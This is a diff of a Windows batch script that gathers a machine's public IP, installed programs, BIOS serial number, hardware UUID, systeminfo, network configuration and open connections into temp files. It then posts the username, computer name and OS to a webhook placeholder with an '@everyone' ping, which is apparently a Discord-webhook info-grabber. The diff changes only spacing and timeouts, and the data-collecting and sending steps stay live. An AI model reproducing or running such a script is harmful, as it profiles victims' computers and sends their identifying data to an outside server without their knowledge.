@@ -1,19 +1,18 @@
 @echo off
-timeout 1>nul
 set webhook=YOUR_WEBHOOK_HERE
 curl https://api.ipify.org > %userprofile%\AppData\Local\Temp\ipp.txt
-timeout 1>nul
+timeout 2 > nul
 powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table" > %userprofile%\AppData\Local\Temp\programms.txt
-echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
-wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
-echo Service Tag:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
-wmic bios get serialnumber>>%userprofile%\AppData\Local\Temp\System_INFO.txt
-echo CPU:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
-wmic cpu get name>>%userprofile%\AppData\Local\Temp\System_INFO.txt
-systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt
-wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
-ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt
-netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt
+echo Hard Drive Space: > %userprofile%\AppData\Local\Temp\System_INFO.txt
+wmic diskdrive get size >> %userprofile%\AppData\Local\Temp\System_INFO.txt
+echo Service Tag: >> %userprofile%\AppData\Local\Temp\System_INFO.txt
+wmic bios get serialnumber >> %userprofile%\AppData\Local\Temp\System_INFO.txt
+echo CPU: >> %userprofile%\AppData\Local\Temp\System_INFO.txt
+wmic cpu get name >> %userprofile%\AppData\Local\Temp\System_INFO.txt
+systeminfo > %userprofile%\AppData\Local\Temp\sysi.txt
+wmic csproduct get uuid > %userprofile%\AppData\Local\Temp\uuid.txt
+ipconfig /all > %userprofile%\AppData\Local\Temp\ip.txt
+netstat -an > %userprofile%\AppData\Local\Temp\netstat.txt
 
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"@everyone ```User = %username%  time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
 
